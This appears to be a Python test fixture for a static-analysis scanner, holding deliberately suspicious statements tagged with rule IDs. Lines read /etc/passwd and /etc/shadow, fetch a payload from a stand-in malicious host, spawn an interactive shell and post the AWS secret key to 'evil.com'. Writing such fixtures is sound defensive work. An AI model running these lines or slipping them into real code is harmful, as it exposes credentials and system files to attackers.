import os
import subprocess
import socket
import base64
import requests


def run_sample_patterns():
    """
    Static-analysis test patterns.
    These statements simulate suspicious behavior for AST/rule testing.
    """

    # EXECUTION RULES
    #subprocess.call("ls -la", shell=True)  # EXEC-003

    print("hello world")

    __import__("os").system("ls")  # EXEC-002, EXEC-003

    import subprocess as sp
    sp.Popen("cat /etc/passwd", shell=True)  # EXEC-003, FILE-001

    
    requests.get("http://malicious.com/payload.exe")  # NET-001

    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # NET-002
    subprocess.call(["/bin/sh", "-i"])  # NET-002

    
    with open("/etc/shadow", "r") as f:  # FILE-001
        print(f.read())

    # EVASION RULES
    c = base64.b64decode("SGVsbG8=")  # OBF-001

    # EXFILTRATION RULES
    key = os.environ.get("AWS_SECRET_ACCESS_KEY")  # EXFIL-002
    requests.post("http://evil.com", data=key)  # NET-001
